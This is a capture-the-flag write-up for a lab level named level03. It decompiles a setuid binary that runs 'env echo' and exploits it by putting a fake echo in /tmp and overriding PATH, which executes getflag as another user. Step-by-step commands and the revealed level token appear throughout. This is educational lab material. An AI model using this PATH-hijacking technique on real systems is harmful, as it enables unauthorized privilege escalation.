# level03

flag03, scouting.

```sh
ls -lA
```

Something looks interesting:

```
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

The file named `level03` permissions are like nothing we have seen so far. Let's just check what it is:

```sh
file level03
```

Output:

```
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

This is an ELF executable file, aka a binary program. Curriously enough, the file is readable. Time for Ghidra.

```c
int main(int argc,char **argv,char **envp)
{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  gid_t gid;
  uid_t uid;

  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}
```

In short:
* Set real, effective and saved GID to effective GID
* Set real, effective and saved UID to effective UID
* Execute `/usr/bin/env echo Exploit me`

`env` has some [interesting properties](https://pubs.opengroup.org/onlinepubs/009695299/utilities/env.html). One of them is that is will always follow the `PATH` environment variable. It should be possible to execute basically anything we want as another user if we override `echo`.

```sh
touch echo
```

```
touch: cannot touch `echo': Permission denied
```

Ah. Let's find a directory where we can do what we want.

```sh
find / -type d -writable -executable 2>/dev/null
```

```
/run/shm
/run/lock
/tmp
/var/crash
/var/lib/php5
/var/tmp
```

Even though the assignment discourages its usage, `/tmp` will do.

```sh
echo 'echo bbrassar' > /tmp/echo && chmod +x /tmp/echo && env PATH=/tmp ./level03
```

Output:

```
bbrassar
```

Great. Now something more useful:

```sh
echo '/usr/bin/whoami' > /tmp/echo && chmod +x /tmp/echo && env PATH=/tmp ./level03
```

Output:

```
flag03
```

Alright! Now how about:

```sh
echo '/bin/getflag' > /tmp/echo && chmod +x /tmp/echo && env PATH=/tmp ./level03
```

Output:

```
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

Perfect.

```
level04@localhost's password: qi0maab88jeaj46qoumi7maus
```

Next.
